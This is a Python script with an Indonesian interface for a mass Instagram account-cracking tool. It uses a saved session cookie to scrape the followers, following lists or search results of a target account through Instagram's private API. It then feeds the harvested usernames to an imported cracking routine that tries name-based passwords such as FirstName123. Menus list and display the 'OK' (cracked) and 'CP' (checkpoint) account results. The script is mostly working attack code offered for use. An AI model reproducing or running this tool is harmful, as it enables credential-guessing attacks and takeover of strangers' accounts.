import requests, json, time, os, sys

#from insta.dump import crack as cr
from dump import crack as cr
#----------- MODULE RICH -------------
from rich import print as prints
from rich.console import Console
from rich.columns import Columns
from rich.table import Table
from rich.panel import Panel

merah  = '[#FF0022]'
hapus  = '[/]'
biru_m = '[bold cyan]'
hijau  = '[#00FF33]'
kuning = '[#FFFF00]'


O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
M = '\x1b[1;91m' # MERAH

class Xnxx:

    def __init__(self):
        self.tol = Console()
        self.ses = requests.Session()
        self.hsl_cp, self.hsl_ok = [], []
        self.pwa, self.xxx, self.men = [], [], []
        self.cok = open("coki_ig.txt", "r").read()

    def ua_ig(self):
        xx = "Mozilla/5.0 (Linux; Android 5.1; S5140 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 Instagram 86.0.0.24.87 Android (22/5.1; 320dpi; 720x1184; S5140/GINZZU; S5140; S5140; mt6735; ru_RU; 147375141)"
        return xx

    def hsl_crac(self):
        prints(Panel(f"""[01] check hasil crack ok
[02] check hasil crack cp
[03] hapus hasil crack
[04] kembali ke menu awal""",padding=(0,5),style="bold white"))
        xz = input(f"[?] input: ")
        if xz in[""]:
            print("");prints(Panel(f"😡 jangan kosong"));time.sleep(3);self.hsl_crac()
        elif xz in["1", "01"]:
            try:
                dirs = os.listdir("results/OK")
                for i in dirs:
                    self.hsl_ok.append(i)
            except:pass
            if len(self.hsl_ok)==0:
                prints(Panel(f"🙁 {merah}tidak ada file yang mau di cek{hapus}"));exit()
            else:
                self.xa = {}
                self.xx = 0
                prints(Panel(f"[{biru_m}!{hapus}]  HASIL {hijau}OK {hapus}YANG TERSIMPAN DI FOLDER ANDA", padding=(0,5),style="bold white"))
                table = Table(title=f"")
                table.add_column("nomor",width=5,justify="center",style="bold cyan")
                table.add_column("HASIL OK",width=36,justify="center",style="bold white")
                table.add_column("TOTAL AKUN",width=10,justify="center",style="bold green")
                for ini in self.hsl_ok:
                    try:fi1 = open(f"results/OK/{ini}").readlines()
                    except:continue
                    self.xx+=1
                    if self.xx<100:
                        nom =""+str(self.xx)
                        self.xa.update({str(self.xx):str(ini)})
                        self.xa.update({nom+"0":str(self.xx)})
                        table.add_row(f"{nom}", f"{ini}", f"{str(len(fi1))}")
                    else:
                        self.xa.update({str(self.xx):str(ini)})
                        table.add_row(f"{nom}", f"{ini}", f"{str(len(fi1))}")
                self.tol.print(table)
                prints(Panel(f"[{biru_m}!{hapus}]  SILAHKAN PILIH NOMOR YANG MAU ANDA CEK  [{biru_m}!{hapus}]", padding=(0,5),style="bold white"))
                file = input(f"  [{M}?{N}] nomor : ")
                try:ajg = self.xa[file]
                except KeyError:
                    prints(Panel(f"😡 file {merah}{file}{hapus} tidak ada cek nomor nya pler"));exit()
                nm_file = ajg.replace("-", " ")
                hps_nm  = nm_file.replace(".txt", "").replace("OK", "")
                total = open(f"results/OK/{ajg}", "r").readlines()
                prints(Panel(f"[{biru_m}•{hapus}] Hasil crack pada tanggal:{hijau}{hps_nm}{hapus} total: [bold blue]{len(total)}[/]", padding=(0,5),style="bold white"))
                for ha in total:
                    kontol = ha.replace("\n","")
                    titid  = kontol.replace(" [✓] ","  \x1b[0m[\x1b[1;92m✓\x1b[0m]\x1b[1;92m ")
                    print(f"{titid}{N}");time.sleep(0.03)
                prints(Panel(f"     {hijau}PROSES MENGECEK HASIL SELESAI{hapus}", padding=(0,5),style="bold white"))
                input(f"[ {O}KEMBALI{N} ] ")
        elif xz in["2", "02"]:
            try:
                xxx = os.listdir("results/CP")
                for z in xxx:
                    self.hsl_cp.append(z)
            except:pass
            if len(self.hsl_cp)==0:
                prints(Panel(f"🙁 {merah}tidak ada file yang mau di cek{hapus}"));exit()
            else:
                self.xa = {}
                self.xx = 0
                prints(Panel(f"[{biru_m}!{hapus}]  HASIL {kuning}CP {hapus}YANG TERSIMPAN DI FOLDER ANDA", padding=(0,8),style="bold white"))
                table = Table(title=f"")
                table.add_column("nomor",width=5,justify="center",style="bold cyan")
                table.add_column("HASIL CP",width=36,justify="center",style="bold white")
                table.add_column("TOTAL AKUN",width=10,justify="center",style="bold green")
                for tod in self.hsl_cp:
                    try:fi2 = open(f"results/CP/{tod}").readlines()
                    except:continue
                    self.xx+=1
                    if self.xx<100:
                        nom =""+str(self.xx)
                        self.xa.update({str(self.xx):str(tod)})
                        self.xa.update({nom+"0":str(self.xx)})
                        table.add_row(f"{nom}", f"{tod}", f"{str(len(fi2))}")
                    else:
                        self.xa.update({str(self.xx):str(tod)})
                        table.add_row(f"{nom}", f"{tod}", f"{str(len(fi2))}")
                self.tol.print(table)
                prints(Panel(f"[{biru_m}!{hapus}]  SILAHKAN PILIH NOMOR YANG MAU ANDA CEK  [{biru_m}!{hapus}]", padding=(0,8),style="bold white"))
                file = input(f"  [{M}?{N}] nomor : ")
                try:ajg = self.xa[file]
                except KeyError:
                    prints(Panel(f"😡 file {merah}{file}{hapus} tidak ada cek nomor nya pler"));exit()
                nm_file = ajg.replace("-", " ")
                hps_nm  = nm_file.replace(".txt", "").replace("CP", "")
                total = open(f"results/CP/{ajg}", "r").readlines()
                prints(Panel(f"[{biru_m}•{hapus}] Hasil crack pada tanggal:{hijau}{hps_nm}{hapus} total: [bold blue]{len(total)}[/]", padding=(0,8),style="bold white"))
                for ha in total:
                    kontol = ha.replace("\n","")
                    titid  = kontol.replace(" [×] ", "  \x1b[0m[\x1b[1;93m×\x1b[0m]\x1b[1;93m ")
                    print(f"{titid}{N}");time.sleep(0.03)
                prints(Panel(f"      {kuning}PROSES MENGECEK HASIL SELESAI{hapus}", padding=(0,8),style="bold white"))
                input(f"   [ {O}KEMBALI{N} ] ")
        elif xz in["3","03"]:
            prints(Panel(f"""[{biru_m}01{hapus}] hapus hasil ok
[{biru_m}02{hapus}] hapus hasil cp
[{biru_m}03{hapus}] kembali""", title=f"{merah}HAPUS HASIL CRACK{hapus}", padding=(0,8),style="bold white"))
            pil = input(f"[{O}?{N}] pilih: ")
            if pil in ["1", "01"]:
                try:os.remove("results/OK")
                except:os.system("rm -rf results/OK")
                try:os.mkdir("results/OK")
                except:pass
                prints(Panel(f"[{hijau}✓{hapus}] berhasil menghapus semua hasil ok."));input(f"   [ {O}TEKAN ENTER {N} ] ")
            elif pil in ["2", "02"]:
                try:os.remove("results/CP")
                except:os.system("rm -rf results/CP")
                try:os.mkdir("results/CP")
                except:pass
                prints(Panel(f"[{hijau}✓{hapus}] berhasil menghapus semua hasil cp."));input(f"   [ {O}TEKAN ENTER {N} ] ")
            elif pil in ["3", "03"]:
                self.hasil()
            else:
                print("");prints(Panel(f"😡 memu [bold red]{pil}[/] tidak ada, cek menu nya!"));time.sleep(3);self.hsl_crac()
        elif xz in["4","04"]:
            exit()
        else:
            print("");prints(Panel(f"😡 memu [bold red]{xz}[/] tidak ada, cek menu nya!"));time.sleep(3);self.hsl_crac()

    def convert(self, xx):
        try:
            id = self.ses.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={xx}', cookies={"cookie":self.cok}, headers={"user-agent":self.ua_ig(),"x-ig-app-id":'936619743392459'}).json()["data"]["user"]
            xz = id["id"]
        except KeyError:
            exit()
        return xz

    def pengikut(self):
        self.men.append("pengikut")
        prints(Panel.fit(f"[[bold red]![/]] masukan username akun target", padding=(0,16), style="bold white"))
        az = input(f"[{M}?{N}] username: ")
        if az in ["", " "]:
            prints(Panel(" [!] jangan kosong", style="bold white", padding=(0,5)));time.sleep(2);self.pengikut()
        id = self.convert(az)
        self.dump(f"https://i.instagram.com/api/v1/friendships/{id}/followers/?count=100000", id)
        prints()
        self.total()

    def mengikut(self):
        self.men.append("pengikut")
        prints(Panel.fit(f"[[bold red]![/]] masukan username akun target", padding=(0,16), style="bold white"))
        az = input(f"[{M}?{N}] username: ")
        if az in ["", " "]:
            prints(Panel(" [!] jangan kosong", style="bold white", padding=(0,5)));time.sleep(2);self.pengikut()
        id = self.convert(az)
        self.dump(f"https://i.instagram.com/api/v1/friendships/{id}/following/?count=100000", id)
        prints()
        self.total()

    def pencarii(self):
        prints(Panel(" [+] masukan jumblah target yang anda inginkan", padding=(0,8), style="bold white"))
        pil = int(input(f"[{M}?{N}] input jumblah: "))
        prints(Panel("[!] masukan nama random untuk di cari, harus publik not privatt.",padding=(0,1), style="bold white"))
        for i in range(pil):
            i+1
            az = input(f"[{M}?{N}] username: ")
            self.search(az)
        prints()
        self.total()

    def search(self, id):
        try:
            x = self.ses.get(f"https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query={id}&rrank_token=0.35875757839675004&include_reel=true", cookies={"cookie":self.cok}, headers={"user-agent":self.ua_ig()})
            z = json.loads(x.text)
            for i in z["users"]:
                self.xxx.append(i["username"]+"|"+i["full_name"])
            sys.stdout.write(f"\r[{O}*{N}] sedang mengumpulkan {H}{len(self.xxx)}{N} username... ");sys.stdout.flush()
        except KeyError:
            exit("[!] username tidak di temukan")

    def dump(self, link, id):
        try:
            x = self.ses.get(link, cookies={"cookie":self.cok}, headers={"user-agent":self.ua_ig()})
            x_jason=json.loads(x.text)
            for i in x_jason['users']:
                self.xxx.append(i["username"]+"|"+i["full_name"])
            if "pengikut" in self.men:
                maxid=x_jason['next_max_id']
                for z in range (9999):
                    x=self.ses.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=100&max_id='+maxid,cookies={"cookie":self.cok},headers={"user-agent":self.ua_ig()})
                    x_jason=json.loads(x.text)
                    try:
                        for i in x_jason['users']:
                            self.xxx.append(i["username"]+"|"+i["full_name"])
                        try:maxid=x_jason['next_max_id']
                        except:
                            break
                        sys.stdout.write(f"\r[{O}*{N}] sedang mengumpulkan {H}{len(self.xxx)}{N} username... ");sys.stdout.flush()
                    except:
                        if "challenge" in x.text:
                            break
                        else:
                            continue
        except requests.ConnectionError:
            exit("[!] tidak ada koneksi")
        except KeyError:
            exit("[!] username tidak di temukan")

    def total(self):
        urut = []
        prints(Panel(f"     success mengunmpulkan [bold green]{str(len(self.xxx))}[/] username", style="bold white", padding=(0,5)))
        prints(Panel(f"[[bold cyan]+[/]] pilih password yang menurut anda cocok", style="bold white", padding=(0,5)))
        urut.append(Panel(f"""[[bold cyan]1[/]] FirstName123 Firstname1234\n[[bold cyan]2[/]] Name123,Name1234,Name1235""",style="bold white", padding=(0,1)))
        urut.append(Panel(f"""[[bold cyan]3[/]] FirstName+123,FullName\n[[bold cyan]4[/]] Firstname123,1234+Sandi""",style="bold white", padding=(0,1)))
        self.tol.print(Columns(urut))
        pil = input("[?] pilih: ")
        if pil in ["", " "]:
            prints(Panel(" [!] jangan kosong", style="bold white", padding=(0,5)));time.sleep(2);self.total()
        elif pil in ["1", "01"]:
            cr.Krek(self.xxx, pil)
        elif pil in ["2", "02"]:
            cr.Krek(self.xxx, pil)
        elif pil in ["3", "03"]:
            cr.Krek(self.xxx, pil)
        elif pil in ["4", "04"]:
            prints(Panel(f' [[bold cyan]![/]] kata sandi minimal 6 karakter, gunakan "[bold yellow],[/]" ([bold yellow]koma[/]) untuk kata sandi berikut nya', padding=(0,2),style="bold white"))
            kata = input(f"[?] sandi: ")
            xxxx = kata.split(",")
            for i in xxxx:
                self.pwa.append(i)
            prints(Panel(f"kata sandi tambahan -> [ [bold red]{kata} [/]]",style="bold white"))
            cr.Krek(self.xxx, pil)
        else:
            prints(Panel(" [!] input yang bener", style="bold white", padding=(0,5)));time.sleep(2);self.total()

    def Keluaarr(self):
        prints(Panel("[?] apakah anda yakin ingin keluar (y/t)", style="bold white", padding=(0,5)))
        pill = input("[?] chose: ")
        if pill in ["", ""]:
            prints(Panel(" [!] jangan kosong", style="bold white", padding=(0,5)));time.sleep(2);self.Keluaarr()
        elif pill in ["y", "Y"]:
            prints(Panel("mohon tunggu sedang menghapus cookie", style="bold white", padding=(0,5)));time.sleep(3)
            try:os.remove("coki_ig.txt")
            except:pass
            prints(Panel("selamat tinggal:)", padding=(0,5),style="bold white"))
            exit()